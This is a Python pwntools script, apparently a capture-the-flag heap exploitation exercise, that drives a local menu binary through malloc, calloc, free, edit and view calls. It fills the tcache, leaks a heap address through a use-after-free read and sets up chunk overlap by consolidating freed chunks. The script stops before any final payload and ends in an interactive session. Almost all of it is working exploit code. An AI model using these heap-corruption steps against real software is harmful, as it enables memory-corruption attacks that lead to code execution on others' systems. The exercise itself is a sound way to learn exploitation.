from pwn import *
elf =context.binary = ELF("./main")
context.log_level ="debug"


io = process()

def malloc(index,size):
  io.sendlineafter(b">>",b"1")
  io.sendlineafter(b">>",str(index))
  io.sendlineafter(b">>",str(size))


def calloc(index,size):
  io.sendlineafter(b">>",b"2")
  io.sendlineafter(b">>",str(index))
  io.sendlineafter(b">>",str(size))

def free(index):
  io.sendlineafter(b">>",b"3")
  io.sendlineafter(b">>",str(index))

def edit(index,payload):
  io.sendlineafter(b">>",b"4")
  io.sendlineafter(b">>",str(index))
  io.sendline(payload)

def view(index):
  io.sendlineafter(b">>",b"5")
  io.sendlineafter(b">>",str(index))

gdb.attach(io)

for i in range(0x7):
  malloc(i,0x100)

#we have to cause chunk overlapping
malloc(0x7,0x100)#prev
malloc(0x8,0x100)#victim

malloc(0x9,0x10)

for i in range(0x7):
  free(i)

view(0x0)
io.recvn(0x1)
heap_leak = int(unpack(io.recvn(0x6),"all"))<<12
log.critical(f"heap leak:{hex((heap_leak))}")

free(0x8)#unsorted bin
free(0x7)#prev chunk consolidation

# malloc(0xa,0x100)
for i in range(0x7):
  malloc(i,0x100)

malloc(0x10,0x100)
free(0x8)

malloc(0x11,0x210)




















io.interactive()
